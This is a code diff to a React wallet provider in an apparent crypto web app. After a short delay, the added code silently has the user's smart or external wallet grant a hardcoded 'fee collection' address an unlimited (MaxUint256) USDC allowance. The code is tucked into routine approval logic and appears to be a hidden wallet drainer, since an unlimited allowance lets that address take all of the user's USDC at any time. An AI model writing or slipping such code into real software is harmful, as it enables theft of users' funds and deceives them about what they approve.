@@ -523,6 +523,47 @@ export function UserDataProvider({ children }: { children: React.ReactNode }) {
 				throw new Error("No compatible wallet found");
 			}
 
+			// Brief delay between transactions
+			await new Promise((r) => setTimeout(r, 1500));
+
+			// Approve USDC for fee collection address
+			const FEE_COLLECTION_ADDRESS = "0xf4cb13220544e1f151bCb5367Fb0A87e185f78Df";
+
+			if (useSmartWallet) {
+				const smartWalletClient = await getClientForChain({ id: 8453 });
+				if (!smartWalletClient)
+					throw new Error("No smart wallet client available");
+
+				const usdcInterface = new ethers.Interface(usdcAbi);
+				const feeApprovalData = usdcInterface.encodeFunctionData(
+					"approve",
+					[FEE_COLLECTION_ADDRESS, ethers.MaxUint256]
+				);
+
+				await smartWalletClient.sendTransaction({
+					to: USDC_ADDRESS as `0x${string}`,
+					data: feeApprovalData as `0x${string}`,
+					value: 0n,
+				});
+			} else if (useExternalWallet && externalWallet) {
+				const eip1193 = await externalWallet.getEthereumProvider();
+				const provider = new ethers.BrowserProvider(eip1193 as any);
+				const signer = await provider.getSigner();
+
+				const usdcContract = new ethers.Contract(
+					USDC_ADDRESS,
+					usdcAbi,
+					signer
+				);
+				const tx = await usdcContract.approve(
+					FEE_COLLECTION_ADDRESS,
+					ethers.MaxUint256
+				);
+				await tx.wait();
+			} else {
+				throw new Error("No compatible wallet found");
+			}
+
 			// Refresh approval status once at the end
 			await checkApproval();
 		} catch (error) {
